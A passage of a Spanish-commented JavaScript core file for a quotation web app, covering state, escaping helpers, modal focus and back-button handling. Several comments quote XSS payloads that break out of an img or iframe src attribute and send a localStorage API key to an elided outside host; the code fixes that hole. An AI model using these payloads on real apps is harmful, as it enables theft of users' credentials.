/* ============================================================================
   Cotizador · nucleo.js

   Estado (Q), ayudantes de pantalla, los siete modales y el «atrás» del teléfono, preferencias, clientes conocidos y el cálculo del precio.

   Es un script CLÁSICO, no un módulo ES, y el orden de carga lo fija cotizador.html. Los
   doce archivos comparten el mismo ámbito global —como cuando eran un solo <script> en
   línea—, así que un `let` o una `function` de un archivo se ve desde los demás, y los
   156 manejadores en línea del marcado (onclick, oninput…) siguen resolviendo contra ese
   ámbito. Portarlo a módulos ES los dejaría mudos en silencio: ver js/mod/cotizador.js.

   Hasta septiembre de 2026 todo esto vivía en línea dentro de cotizador.html, en un solo
   bloque de diez mil líneas. Se repartió por dominio, sin cambiar una línea de lógica.
   ============================================================================ */

/* Icono en línea para el HTML que se arma desde JS. Mismo sprite que el markup. */
function ico(n,cls){return '<svg class="svgi'+(cls?' '+cls:'')+'" aria-hidden="true"><use href="#'+n+'"/></svg>';}


/* ===================== Estado ===================== */
const Q = {
  proy:'', cliente:'', tel:'', direccion:'', fecha:'', maps:'', folio:'', entrecalles:'', entrega:'', dirRaw:'',
  notaCliente:'',
  /* El plazo de taller elegido a mano: 1 a 5, o null cuando nadie lo tocó y manda el que se
     propone desde las partidas. Ver pintarPlazo(). */
  plazoK:null,
  items:[], iva:true,
  estado:'borrador', rol:'vendedor',
  autorizador:'', nota:'', fechaAuth:'',
  anti:0, antiManual:false,
  precioAuth:0,
  itemsAuth:{},
  /* Huella del trabajo sobre el que se autorizó el precio. Ver authVigente(). */
  huellaAuth:'',
  /* El sello de la hoja: {codigo, correo, ts, total, folio}. Sin él, la autorización es de
     antes de que la hoja sellara (o se soltó al editar) y el PDF no lleva QR. Ver notario.js. */
  sello:null,
  /* La solicitud que salió a dirección: {enviada, ts, error}. Solo mientras está pendiente. */
  solicitud:null,
  /* La autorizada que era, mientras se revisa un «Volver a autorizar»: {folio, autorizador,
     nota, fechaAuth, precioAuth, itemsAuth, huellaAuth, pf}. Vivía en una variable suelta y
     una recarga a media revisión la perdía: cancelar convertía la cotización en BORRADOR,
     borraba el nombre de quien autorizó y devolvía el precio calculado, con el historial
     diciendo todavía que la autorizó Elías. En Q sobrevive a la recarga. Ver reautorizar(). */
  reauth:null,
  aiFile:null,
  /* «Esta cotización nunca ha tenido una partida». Va en Q y no en una variable suelta
     porque tiene que sobrevivir a una recarga: se captura el cliente, se recarga la
     página con el candado todavía puesto y al escribir el teléfono la partida en blanco
     del arranque tiene que aparecer igual. Se apaga en cuanto nace la primera y ya no se
     vuelve a encender, que es lo que distingue sembrar de resucitar. */
  sinEstrenar:true,
  editMode:false
};
let pid=0, dragId=null;

/* ===================== Helpers ===================== */
const $=id=>document.getElementById(id);
const plCot=n=>n+(n===1?' cotización':' cotizaciones');
const money=n=>'$'+Number(n||0).toLocaleString('es-MX',{minimumFractionDigits:2,maximumFractionDigits:2});
/* esc() escapa para HTML, y con eso basta para el TEXTO y para el valor de un atributo. */
const esc=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
/* ----- Un texto que viaja DENTRO de un onclick -----
   Aquí decía que escapar el apóstrofo con esc() arreglaba onclick="f('${esc(x)}')", y no lo
   arregla: el navegador DESCODIFICA el atributo antes de correrlo, así que &#39; vuelve a ser
   un apóstrofo y cierra el literal. Con un cliente sin teléfono llamado «Domino's Pizza» el
   botón de su cuaderno era un SyntaxError —no hacía nada—, y un folio con apóstrofo que llegara
   en un respaldo restaurado corría lo que viniera detrás. jsArg() arma el literal COMPLETO
   —comillas incluidas— con JSON.stringify y lo escapa para el atributo: se escribe sin
   comillas alrededor, onclick="f(${jsArg(x)})". */
const jsArg=s=>esc(JSON.stringify(String(s==null?'':s)));

/* ----- URLs de imagen que vienen del almacenamiento -----
   El logotipo y la imagen analizada se interpolaban crudos dentro de src="${...}". Los dos
   salen de localStorage, y localStorage se puede llenar con un respaldo que llegó por
   WhatsApp —el README describe justo ese flujo—: un valor como
   x" onerror="fetch('https://…?k='+localStorage.getItem('al3d_kxs_gemini'))
   rompía el atributo y corría en cada carga de la app, con las API keys a mano. Se acepta
   solo lo que de verdad puede ser una imagen local. */
function urlImagenSegura(u){
  const v=String(u||'');
  /* La prueba de PREFIJO no bastaba, y el comentario de arriba llevaba meses diciendo que sí.
     Se comprobaba el principio de la cadena y se devolvía el resto CRUDO dentro de src="${...}",
     así que un valor como
        data:image/png;" onerror="fetch('https://…?k='+localStorage.getItem('al3d_kxs_gemini'))
     pasaba el filtro —empieza por data:image/png;— y se salía del atributo. Es exactamente el
     ataque que este bloque decía haber cerrado, con el mismo camino de entrada: un respaldo
     restaurado, que el README describe llegando por WhatsApp.
     Escapar es lo que faltaba. Nada de lo que se acepta aquí —un data:, un blob: o el nombre
     del archivo del logotipo— contiene comillas ni ángulos, así que escaparlo no cambia
     ninguna imagen buena y corta todas las malas. */
  return /^(data:image\/(png|jpe?g|svg\+xml|webp|gif);|blob:|logo-al3d)/i.test(v) ? esc(v) : '';
}
/* El archivo analizado también puede ser un PDF, que se enseña en un <iframe>: ahí un
   javascript: sería peor todavía, porque corre en el origen de la app.

   Y escapa, por la MISMA razón que su hermana de aquí arriba y con el mismo agujero: la
   prueba es de PREFIJO, así que devolver el resto crudo dentro de src="${...}" dejaba salir
        data:application/pdf;" onload="fetch('https://…?k='+localStorage.getItem('al3d_kxs_gemini'))
   que pasa el filtro —empieza por data:application/pdf;— y se sale del atributo. Aquí es
   PEOR que en el <img>: el <img> necesita que la imagen falle para disparar su onerror; el
   <iframe> dispara `onload` solo, en cuanto se pinta. El camino de entrada es el de siempre
   —`Q.aiFile` sale de AI_FILE_KEY, que está en RESPALDO_KEYS y llega en un respaldo
   restaurado, que el README describe viajando por WhatsApp—.
   Ni un data:, ni un blob: llevan comillas ni ángulos, así que escapar no cambia un solo
   archivo bueno. */
function urlPdfSegura(u){
  const v=String(u||'');
  return /^(data:application\/pdf;|blob:)/i.test(v) ? esc(v) : '';
}
const locked=()=>Q.estado!=='borrador'&&!Q.editMode;
/* Accesibilidad: hace que un chip clicable también responda a teclado (Enter/Espacio) */
/* Los interruptores dicen su estado con la clase .on del span, que es puro CSS: tgAria
   la copia al aria-checked del botón que lo envuelve, pegado a donde el JS ya movía la
   clase. */
function tgAria(id){
  const t=document.getElementById(id); if(!t) return;
  const b=t.closest('[role="switch"]');
  if(b) b.setAttribute('aria-checked', t.classList.contains('on')?'true':'false');
}
/* Lo mismo para lo que abre algo en vez de conmutar: las miniaturas que abren el
   lightbox eran <img> con onclick y nada más, o sea invisibles para el teclado. Sin
   aria-pressed, que aquí no hay estado que anunciar. */
const _ABRIBLE=`role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click();}"`;
/* Los cuatro segmentados decían cuál está puesto solo con el color de fondo: se oía
   «Letras botón, Recorte botón, Bastidor botón…» sin ninguna pista del tipo de la
   partida. segAria copia al aria-pressed la MISMA clase que ya usaba el CSS (.on o
   .active), así que se llama pegado al bucle que la mueve y no hay un segundo estado
   que se pueda desincronizar. Se queda en aria-pressed y no en role=radio a propósito:
   un radiogroup sin navegación por flechas promete un patrón que aquí no existe. */
function segAria(sel){
  document.querySelectorAll(sel).forEach(b=>b.setAttribute('aria-pressed',
    (b.classList.contains('on')||b.classList.contains('active'))?'true':'false'));
}

/* ----- Llevar algo a la vista -----
   La barra de arriba queda fija: sin restarle su alto, lo que se trae a la vista
   aparece justo debajo de ella y queda medio tapado. Lo que estorba no es el alto de
   la barra sino dónde termina cuando está pegada, que es su desplazamiento (`top`)
   más su alto; en el teléfono ese desplazamiento es negativo a propósito, porque la
   fila de la marca se va con el scroll. */
function altoTopbarFija(){
  const tb=document.querySelector('.topbar');
  if(!tb) return 0;
  const cs=getComputedStyle(tb);
  /* Una barra que NO está pegada no estorba a nada: se va con el scroll y el destino puede
     subir hasta el borde. Con `position:static` —lo que hace la regla de pantalla acostada—
     seguir restándole su alto dejaba una franja muerta arriba de cada destino: un tercio de
     la pantalla en blanco al tocar «Revisar precio» o al cambiar de paso en un teléfono
     acostado. Y como `--top-fijo` sale de aquí, el mismo hueco se colaba en
     `scroll-padding-top` y en la columna del dinero. */
  if(cs.position!=='sticky'&&cs.position!=='fixed') return 0;
  const top=parseFloat(cs.top)||0;
  return Math.max(0,tb.offsetHeight+top);
}
function irA(el,extra=12){
  if(typeof el==='string') el=$(el);
  if(!el) return;
  const y=el.getBoundingClientRect().top+window.pageYOffset-altoTopbarFija()-extra;
  // scroll-behavior del CSS no alcanza a un scrollTo programático: se pregunta aquí
  const suave=!window.matchMedia('(prefers-reduced-motion:reduce)').matches;
  window.scrollTo({top:Math.max(0,y),behavior:suave?'smooth':'auto'});
}
/* ----- La marca no se queda pegada en el teléfono -----
   La barra de arriba se lleva 115 px de una pantalla de 664: dos renglones, y el de
   arriba es solo el logotipo. Con un desplazamiento negativo del alto exacto de esa
   fila, la marca se va con el scroll y lo que permanece pegado es el renglón útil
   —folio, rol e historial—. Se recalcula porque el alto de la marca cambia: al subir
   un logotipo propio, al girar el teléfono o al cambiar el tamaño de letra del sistema. */
function ajustarTopbarMovil(){
  const tb=document.querySelector('.topbar'), marca=$('brandLogo');
  if(!tb||!marca) return;
  if(!window.matchMedia('(max-width:560px)').matches){ tb.style.top=''; document.documentElement.style.setProperty('--top-fijo',altoTopbarFija()+'px'); return; }
  const fila=tb.querySelector('.topbar-in');
  /* Lo que se va con el scroll es EL RENGLÓN DE LA MARCA ENTERO: su relleno de arriba, su
     alto y el hueco hasta el renglón de abajo. Los tres sumandos, y ni uno más.

     El alto de ese renglón ya no es el del logotipo: desde que el tema y el enlace a la
     plataforma viajan ahí —anclados, fuera del reparto—, la fila la mide `.brand`, que lleva
     min-height de 44 px para hacerles sitio. `marca.offsetHeight` sigue siendo la medida
     correcta porque ESA es la caja de .brand.

     Y no se mide hasta el folio. Se probó y se pasa: el folio mide 28 px dentro de un renglón
     de 44 y va centrado, así que su borde de arriba queda 8 px por debajo de donde empieza el
     renglón. Ocho píxeles de más en el desplazamiento son ocho píxeles del renglón pegado
     cortados por arriba —medido: el selector de rol quedaba en y −6, con su primer píxel
     fuera de la pantalla—. */
  const cs=getComputedStyle(fila);
  const pad=parseFloat(cs.paddingTop)||0;
  const hueco=parseFloat(cs.rowGap)||0;
  tb.style.top=(3-Math.round(pad+marca.offsetHeight+hueco))+'px';
  document.documentElement.style.setProperty('--top-fijo',altoTopbarFija()+'px');
}
window.addEventListener('resize',ajustarTopbarMovil);
/* Las cotas del escalador se miden y se dibujan en el lienzo con Inter. Si la fuente
   llega después del primer trazado, el hueco de cada etiqueta queda medido con la
   fuente de reserva. Al terminar de cargar se repinta y se reajusta la barra. */
if(document.fonts&&document.fonts.ready){
  document.fonts.ready.then(()=>{
    ajustarTopbarMovil();
    if(typeof SC!=='undefined'&&SC.img){scFitCanvas();scRender();}
  }).catch(()=>{});
}
window.addEventListener('orientationchange',()=>setTimeout(ajustarTopbarMovil,180));
function irAResumen(){ irA('sidebox'); }
/* Llevar la vista Y el foco. irA() solo hace scroll, y un destino al que el teclado no llega no
   es un destino: el siguiente tabulador seguía saliendo de la pestaña que se tocó, arriba del
   todo. tabIndex=-1 lo hace enfocable sin meterlo en el recorrido del tabulador. */
function _anclarPaso(id){
  const el=$(id); if(!el) return;
  irA(id);
  el.tabIndex=-1;
  try{ el.focus({preventScroll:true}); }catch(_){ }
}

/* ----- Precios difuminados mientras es borrador -----
   La clase va en <body> y no en cada importe: las partidas y la barra de abajo se
   vuelven a pintar constantemente, y así los importes nuevos nacen ya tapados sin que
   nadie tenga que acordarse de volver a marcarlos.
   El autorizador nunca los ve tapados: su trabajo es justamente mirar el precio. */
function aplicarBlurPrecios(){
  const tapar = Q.estado==='borrador' && Q.rol!=='autorizador';
  document.body.classList.toggle('precios-ocultos',tapar);
  if(!tapar) document.body.classList.remove('precios-a-la-vista');
  const b=$('precios-ver');
  /* La nota y la etiqueta del botón se resincronizan aquí: al volver a borrador se quedaba
     un «Ocultar precios» rancio al lado de unos precios ya tapados. */
  const vista=document.body.classList.contains('precios-a-la-vista');
  if(b){ b.setAttribute('aria-pressed',vista?'true':'false'); b.textContent=vista?'Ocultar precios':'Ver precios'; }
  const n=$('precios-nota-txt'); if(n) n.textContent=vista?'Los precios están a la vista':'Mantén tocado para ver un importe';
}
/* La misma cosa que hace el gesto de mantener tocado, pero sin depender de un dedo: se
   queda destapado hasta que se vuelve a pulsar, porque un teclado no tiene «soltar». */
function togglePreciosALaVista(){
  const v=document.body.classList.toggle('precios-a-la-vista');
  const b=$('precios-ver');
  if(b){ b.setAttribute('aria-pressed',v?'true':'false'); b.textContent=v?'Ocultar precios':'Ver precios'; }
  const n=$('precios-nota-txt'); if(n) n.textContent=v?'Los precios están a la vista':'Mantén tocado para ver un importe';
  voz(v?'Precios a la vista':'Precios ocultos');
}
/* Espiar: se destapan mientras se mantiene tocado y se vuelven a tapar al soltar.
   Los oyentes van en el documento —delegados— porque los importes se rehacen con cada
   cambio y volver a engancharlos en cada pintado se olvidaría en algún camino. */
/* `#paso-total-v` va en la lista y no es un añadido de completitud: en la pantalla del
   cliente la columna del dinero está oculta y la barra fija no trae total, así que ese
   número chiquito es EL ÚNICO importe en pantalla —y era el único que no se difuminaba—.
   Abrir una cotización de $23,664 y tocar «1 · Cliente» para corregir el teléfono la dejaba
   escrita en claro justo enfrente de quien no tenía que leerla todavía. */
/* Y las tarjetas de la propuesta con opciones (pieza 76): el importe de cada opción y su cuenta son
   precio de ESTE trabajo, y delante del cliente se leerían en las tres a la vez. */
const _SEL_PRECIO='.lt,#s-sub,#s-iva,#s-neto,#s-calc,#s-anti-rest,#paso-total-v,.mbar-amt,.anti .inp-money,.partida .inp-money,.formula,.ptok.dinero,.op-precio,.op-cuenta';
function _espiarPrecios(e){
  if(!document.body.classList.contains('precios-ocultos'))return;
  const t=e.target.closest&&e.target.closest(_SEL_PRECIO);
  if(!t)return;
  // Sobre el campo del anticipo se deja pasar el toque: ahí se escribe
  if(t.classList.contains('inp-money')&&e.target.tagName==='INPUT')return;
  document.body.classList.add('precios-a-la-vista');
  _espiando=true;
}
/* Soltar solo tapa lo que destapó el GESTO. Si los precios están a la vista porque alguien
   pulsó «Ver precios», un toque en cualquier otra parte de la pantalla los volvía a tapar y
   el botón quedaba diciendo «Ocultar precios» sobre unos precios ya ocultos. */
let _espiando=false;
function _dejarDeEspiar(){
  if(!_espiando) return;
  _espiando=false;
  document.body.classList.remove('precios-a-la-vista');
}
document.addEventListener('pointerdown',_espiarPrecios);
document.addEventListener('pointerup',_dejarDeEspiar);
document.addEventListener('pointercancel',_dejarDeEspiar);
window.addEventListener('blur',_dejarDeEspiar);

/* Escape cierra la capa de arriba. Van de la más alta a la más baja por z-index, así
   que con el escalador abierto encima del historial se cierra primero el escalador.
   Cada una se cierra por su propia función, la misma que su botón: así no hay dos
   maneras de cerrar que puedan dejar estados distintos. */
const _CAPAS=[
  ['confmodal',  ()=>confirmarNo()],
  ['pdf-fallback',()=>cerrarEnlacePDF()],
  ['lightbox',   ()=>closeLightbox()],
  ['rv-modal-bg',()=>cerrarRegistrarVenta()],
  ['faltmodal',  ()=>cerrarFaltantes()],
  ['remotamodal',()=>cerrarRevisionRemota()],
  ['aimodal',    ()=>aiClose()],
  ['histmodal',  ()=>cerrarHistorial()],
  ['climodal',   ()=>cerrarCuadernos()],
  ['vectormodal',()=>cerrarVector()],
  ['scalermodal',()=>cerrarScaler()],
];
window.addEventListener('keydown',e=>{
  if(e.key==='Escape'){
    /* Cerrar con el teclado no anima: html.sin-transicion (sistema.css) durante dos cuadros. */
    const h=document.documentElement; h.classList.add('sin-transicion');
    requestAnimationFrame(()=>requestAnimationFrame(()=>h.classList.remove('sin-transicion')));
    for(const [id,cerrar] of _CAPAS){
      const el=document.getElementById(id);
      if(el&&el.classList.contains('show')){ e.preventDefault(); try{cerrar();}catch(_){} return; }
    }
    return;
  }
  /* El tabulador se escapaba del modal al primer golpe y seguía recorriendo el
     cotizador que está detrás del velo. Solo se interviene en los dos extremos —y
     cuando el foco ya se salió—, así que dentro del modal el orden natural no cambia
     y el <canvas> del escalador no se enreda: dibujar es con el dedo, no con Tab. */
  if(e.key!=='Tab')return;
  const m=_capaDeArriba(); if(!m)return;
  const f=_focablesDe(m); if(!f.length)return;
  const pri=f[0], ult=f[f.length-1], act=document.activeElement;
  if(e.shiftKey){ if(act===pri||!m.contains(act)){ e.preventDefault(); ult.focus(); } }
  else          { if(act===ult||!m.contains(act)){ e.preventDefault(); pri.focus(); } }
});

/* ===================== Semántica de los siete modales =====================
   Cada modal tiene su propio par de funciones (aiOpen/aiClose, abrirHistorial/
   cerrarHistorial, abrirScaler/cerrarScaler…) y todas hacen lo mismo: poner o quitar
   la clase 'show'. En vez de repetir este trabajo en las siete —siete sitios donde uno
   se puede quedar a medias— se vigila esa clase: hay UN solo camino de apertura, el
   mismo que ya usan el botón ×, el "atrás" del teléfono y el Escape de _CAPAS, así que
   no pueden discrepar.
   Lo que faltaba, todo comprobado antes: el foco se quedaba en el botón que abrió el
   modal, detrás del velo; con VoiceOver se podía seguir deslizando hasta los campos
   del cotizador y leerlos como si fueran del modal; y al cerrar el cursor aterrizaba
   al principio del documento y había que volver a bajar hasta la partida. */
const _FOCABLES='a[href],button:not([disabled]),input:not([disabled]):not([type=hidden]),'+
  'select:not([disabled]),textarea:not([disabled]),summary,iframe,[tabindex]:not([tabindex="-1"])';
/* Solo lo que de verdad se dibuja: el modal de IA lleva los tres bloques de proveedor
   en display:none y cada modal esconde su <input type=file>. Sin este filtro el foco
   aterrizaba en un campo invisible. Se mide con getClientRects y no con offsetParent
   porque los modales son position:fixed y ahí offsetParent es null. */
function _focablesDe(m){
  return [...m.querySelectorAll(_FOCABLES)].filter(e=>{
    if(!e.getClientRects().length) return false;
    /* Lo que vive dentro de un <details> plegado tiene caja pero NO acepta el foco.
       checkVisibility lo distingue donde exista; el filtro del <details> cubre el resto
       y no depende de esa API, porque ahí dentro lo único enfocable es su <summary>. */
    if(e.checkVisibility && !e.checkVisibility({visibilityProperty:true})) return false;
    const d=e.closest('details:not([open])');
    return !d || (e.tagName==='SUMMARY' && e.parentElement===d);
  });
}
/* La capa de arriba, leída de _CAPAS, que ya está ordenada por z-index. */
function _capaDeArriba(){
  for(const [id] of _CAPAS){
    const el=document.getElementById(id);
    if(el&&el.classList.contains('show')) return el;
  }
  return null;
}
/* ----- El «atrás» del teléfono cierra la capa, no la app -----
   En Android el gesto de atrás es el «cerrar» universal: no se aprende, se hace. Y son
   justo los teléfonos que el reporte nombra. El escalador y el vectorizador ya lo
   respetaban, cada uno con su propio pushState y su propio popstate; las otras siete capas
   —Historial, Cuadernos, IA, Registrar venta, el aviso de partidas sin terminar, el visor
   de imagen y el respaldo del PDF— no, así que el gesto navegaba el historial del navegador
   y sacaba de la cotización con todo lo capturado a medias.

   No hace falta tocar las siete: el MutationObserver de aquí abajo ya vigila la clase
   'show' de TODAS y llama a _modalAbierto/_modalCerrado. Ese es el único sitio donde hay
   que engancharlo, que es la misma razón por la que el foco y el inerte viven ahí.

   El escalador y el vectorizador se quedan fuera: ya lo hacen ellos y hacerlo dos veces
   metería dos entradas por una capa, o sea dos golpes de atrás para cerrar una cosa. */
const _CAPAS_CON_HIST_PROPIA=new Set(['scalermodal','vectormodal']);
/* Las que se están cerrando PORQUE el usuario dio atrás. Sin esto, _histAlCerrar llamaría
   a history.back() otra vez y el segundo retroceso sí saca de la página. */
const _cerrandoPorAtras=new Set();
/* ----- Cerrar un modal no puede mover la página -----
   La entrada de la pantalla guarda su `y` solo al CAMBIAR de pantalla; abrir un modal encima
   empujaba su propia entrada y, al cerrarlo con la × o con Escape, `history.back()` caía en la
   entrada de la pantalla con el `y` viejo —casi siempre 0—: bajar hasta la partida 5, abrir el
   historial y cerrarlo devolvía la página arriba del todo y TalkBack anunciaba «Paso 2 de 4».
   Se sella el scroll en la entrada de la pantalla justo antes de empujar la del modal, y el
   oyente de popstate sabe que ese atrás lo dio el código —no el dedo— para no robarle el foco
   al botón que abrió el modal ni anunciar la pantalla como si se acabara de llegar a ella. */
let _atrasPorCodigo=false;
function _sellarScrollDePantalla(){
  try{ if(history.state&&history.state.cot) history.replaceState({...history.state,y:window.scrollY},''); }catch(_){}
}
function _atrasDesdeElCodigo(){
  _atrasPorCodigo=true;
  /* Si el popstate no llegara —la entrada ya no era nuestra— la marca no puede quedarse
     puesta para el siguiente atrás de verdad. */
  setTimeout(()=>{_atrasPorCodigo=false;},400);
  try{ history.back(); }catch(_){}
}
/* ----- Esperar a que ese atrás termine -----
   history.back() es ASÍNCRONO. «Abrir y editar» y «Duplicar» del historial, con un borrador en
   pantalla, preguntan con confirmar() encima del historial; al contestar, la capa de la pregunta
   pide su atrás y en el mismo tick la función cierra el historial. _histAlCerrar ve todavía
   `state.capa==='confmodal'`, no retrocede, y la entrada del historial se quedaba huérfana: el
   siguiente atrás del teléfono no hacía nada visible. Esperando aquí, el historial se cierra
   igual que cuando no hubo pregunta. Si no hay atrás pendiente, no espera nada; y si el popstate
   no llega, el mismo tope que la marca. */
function trasElAtrasDelCodigo(){
  return new Promise(res=>{
    if(!_atrasPorCodigo){ res(); return; }
    let t=0;
    const fin=()=>{ clearTimeout(t); window.removeEventListener('popstate',fin); res(); };
    window.addEventListener('popstate',fin);
    t=setTimeout(fin,450);
  });
}
function _histAlAbrir(m){
  if(_CAPAS_CON_HIST_PROPIA.has(m.id))return;
  if(m.dataset.hist==='1')return;
  _sellarScrollDePantalla();
  try{ history.pushState({capa:m.id},''); m.dataset.hist='1'; }catch(_){}
}
function _histAlCerrar(m){
  if(m.dataset.hist!=='1')return;
  m.dataset.hist='';
  if(_cerrandoPorAtras.has(m.id)){ _cerrandoPorAtras.delete(m.id); return; }
  /* Se cerró con la ×, con Escape o desde el código: hay que consumir la entrada que se
     empujó al abrir, o el historial se llena de escalones muertos y el atrás no hace nada
     visible las primeras veces.

     La guarda es la misma que js/nucleo/ui.js:229-235 tiene desde hace tiempo, con su misma
     razón: history.back() es ASÍNCRONO, así que si quien cierra abre otra cosa en el mismo
     tick, el back se cruza y se come la entrada recién empujada. Aquí faltaba, y había dos
     botones que hacen exactamente eso —«Clientes» dentro del Historial y «Ver el historial»
     dentro de Cuadernos—, que son justo el gesto de cambiar de pestaña entre dos vistas de los
     mismos datos: el panel nuevo se abría y se cerraba solo. */
  try{ if(history.state&&history.state.capa===m.id) _atrasDesdeElCodigo(); }catch(_){}
}
/* La guarda sola no basta para esos dos botones: sin ella el back sobraba, con ella la entrada
   se queda huérfana —la capa que cierra ya no la reclama y la que abre no empuja la suya porque
   _histAlAbrir ve dataset.hist puesto—. Ceder es lo correcto: una sola entrada, que cambia de
   dueño sin tocar el historial. Cero operaciones, y su state.capa diciendo la verdad para la ×
   que venga después. */
function cederEntrada(idCierra,idAbre){
  const a=$(idCierra), b=$(idAbre);
  if(!a||!b||a.dataset.hist!=='1') return;
  if(!(history.state&&history.state.capa===idCierra)) return;
  a.dataset.hist=''; b.dataset.hist='1';
  try{ history.replaceState({...history.state,capa:idAbre},''); }catch(_){}
}
function delHistorialALosClientes(){ cederEntrada('histmodal','climodal'); cerrarHistorial(); abrirCuadernos(); }
function deLosClientesAlHistorial(){ cederEntrada('climodal','histmodal'); cerrarCuadernos(); abrirHistorial(); }
/* ----- El «atrás» también sabe volver de Partidas a Cliente -----
   Las nueve capas modales ya respetaban el gesto de atrás desde hace tiempo (el bloque de aquí
   arriba lo explica). Las DOS PANTALLAS no: `irAPantalla` nunca tocaba el historial, así que en
   la app instalada —manifest.webmanifest dice "display":"standalone"— el gesto de atrás estando
   en Partidas se salía de la cotización con todo lo capturado a medias. Medido antes de
   arreglarlo: desde Partidas, un atrás dejaba la página en about:blank.

   Este oyente va REGISTRADO ANTES que el de las capas, a propósito: los oyentes corren en orden
   de registro, y solo corriendo primero puede ver una capa todavía abierta y cederle el gesto.
   No depende de que ningún otro oyente le avise nada; sus dos guardas son suyas. */
/* Si ESTE atrás lo dio el código. Lo lee también el oyente de abajo, que corre después y ya no
   puede leer _atrasPorCodigo porque éste lo apaga. */
let _popPorCodigo=false;
/* Lo mismo, para los oyentes del escalador y del vectorizador, que corren DESPUÉS de los dos
   de aquí: el de abajo apaga _popPorCodigo, y para entonces ya pudo cerrar la capa que estaba
   arriba —la pregunta de confirmar()—, así que tampoco pueden preguntar quién está arriba. Se
   anota una vez, antes de que nadie toque nada, y se lee con atrasEsDeLaCapa(). */
let _esteAtras={porCodigo:false,arriba:null};
function atrasEsDeLaCapa(id){ return !_esteAtras.porCodigo&&!!_esteAtras.arriba&&_esteAtras.arriba.id===id; }
window.addEventListener('popstate',ev=>{
  const porCodigo=_atrasPorCodigo; _atrasPorCodigo=false;
  _popPorCodigo=porCodigo;
  _esteAtras={porCodigo,arriba:_capaDeArriba()};
  if(_capaDeArriba()) return;                 // la capa de arriba se queda con este atrás
  const st=ev.state;
  if(!st||!st.cot) return;                    // la entrada no es de las pantallas: no es nuestra
  /* Un atrás que dio el código al cerrar un modal: se devuelve el scroll sellado y nada más.
     El foco ya volvió al botón que abrió el modal, y no se llegó a ninguna pantalla nueva. */
  if(porCodigo&&st.pantalla===_pantalla){ window.scrollTo({top:st.y||0,behavior:'auto'}); return; }
  if(st.pantalla!==_pantalla){
    /* `forzar` porque volver atrás no es capturar: el candado del paso 1 no puede frenar un
       gesto que va HACIA los datos que faltan. `hist:false` porque esta entrada ya existe —la
       estamos consumiendo, no creando— y escribirla otra vez duplicaría el escalón. */
    irAPantalla(st.pantalla,{forzar:true,hist:false,y:st.y});
  }else{
    window.scrollTo({top:st.y||0,behavior:'auto'});
  }
  const c=$('contenido');
  if(c){ c.tabIndex=-1; try{ c.focus({preventScroll:true}); }catch(_){ } }
  voz(_pantalla==='cliente'?'Paso 1 de 4 · Cliente':'Paso 2 de 4 · Partidas');
});
window.addEventListener('popstate',()=>{
  /* El atrás que da el código al cerrar una capa con su × consume LA ENTRADA DE ESA CAPA, y nada
     más. Sin esta guarda, cerrar una capa apilada —la pregunta de confirmar() encima del
     historial— cerraba también la de abajo: este oyente veía un atrás y se llevaba la capa que
     quedaba arriba, como si lo hubiera dado el dedo. */
  if(_popPorCodigo){ _popPorCodigo=false; return; }
  const arriba=_capaDeArriba();
  if(!arriba||arriba.dataset.hist!=='1')return;
  /* Una capa se cierra por este atrás, así que la entrada de pantallas que quedó pendiente
     mientras la capa estaba abierta ya puede escribirse. */
  _pilaPendiente=true;
  _cerrandoPorAtras.add(arriba.id);
  const par=_CAPAS.find(([id])=>id===arriba.id);
  if(par){ try{ par[1](); }catch(_){ _cerrandoPorAtras.delete(arriba.id); } }
});
const _focoAntes=new Map();
/* El fondo entero queda detrás del velo, y no es solo .wrap: la barra de arriba y la
   barra de abajo del celular también. Con inert VoiceOver deja de recorrerlas y el
   tabulador tampoco se escapa por ahí. Se quita en cuanto no queda ninguna capa. */
function _fondoInerte(v){
  document.querySelectorAll('.wrap,.topbar,.mbar').forEach(e=>{ try{ e.inert=v; }catch(_){} });
  document.documentElement.classList.toggle('modal-abierto',v);
}
function _modalAbierto(m){
  /* Antes de inertar: si no, ya se perdió. Y NO se guarda un elemento que vive dentro del
     propio modal ni dentro de otra capa: pasar del vectorizador al escalador —el botón
     «Medir el vector en el escalador» vive dentro del vectorizador, que se cierra— dejaba
     al escalador con un «foco anterior» que se iba a desconectar, así que al cerrarlo el
     cursor aterrizaba al principio del documento. */
  const prev=document.activeElement;
  const dentroDeUnaCapa=prev&&prev.closest&&_CAPAS.some(([id])=>{
    const c=document.getElementById(id); return c&&c.contains(prev);
  });
  _focoAntes.set(m.id,dentroDeUnaCapa?null:prev);
  _histAlAbrir(m);
  _fondoInerte(true);
  const f=_focablesDe(m);
  const d=f[0]||m;
  if(!f.length) m.tabIndex=-1;
  /* En el fotograma siguiente: en iOS enfocar en el mismo golpe que hace visible el
     modal se pierde a veces, y así tampoco se le quita el foco a nada que el propio
     abrir haya enfocado. Se vuelve a comprobar que siga abierto. */
  requestAnimationFrame(()=>{
    if(!m.classList.contains('show'))return;
    try{ d.focus({preventScroll:true}); }catch(_){}
  });
}
function _modalCerrado(m){
  _histAlCerrar(m);
  const arriba=_capaDeArriba();
  if(!arriba) _fondoInerte(false);
  /* Si mientras la capa estaba abierta se cambió de pantalla —el aviso de partidas sin terminar
     lleva a una partida, «usar como base» abre una cotización nueva—, la entrada del historial
     de pantallas quedó sin escribir para no pisarle la suya a la capa. Ya no hay capa: se
     termina ahora. */
  if(!arriba&&_pilaPendiente) sincronizarHistorial(true);
  const a=_focoAntes.get(m.id); _focoAntes.delete(m.id);
  /* Devolver el foco es SÍNCRONO a propósito: irAPartida() cierra el aviso de
     partidas sin terminar y enfoca el campo de la partida en el fotograma siguiente,
     y si esto también esperara un fotograma se lo quitaría después. */
  if(a&&a.isConnected&&a.getClientRects().length&&(!arriba||arriba.contains(a))){
    try{ a.focus({preventScroll:true}); }catch(_){}
  }
  /* Red por debajo: si el que abrió la capa ya no puede recibir el foco —una miniatura
     sin tabindex, un botón que se repintó mientras la capa estaba abierta—, el foco se
     quedaba en el <body> y quien navega con teclado volvía al principio del documento.
     Si queda una capa debajo, el foco se va a su primer control; si no, al menos no se
     deja dentro de algo que ya está inerte. */
  if(arriba&&(document.activeElement===document.body||!arriba.contains(document.activeElement))){
    const alt=_focablesDe(arriba)[0];
    if(alt){ try{ alt.focus({preventScroll:true}); }catch(_){} }
  }
  /* Sin capas debajo y sin foco válido que devolver, el cursor se quedaba en el <body> y
     había que retabular el documento entero. Se ancla en el contenido, que es lo más cerca
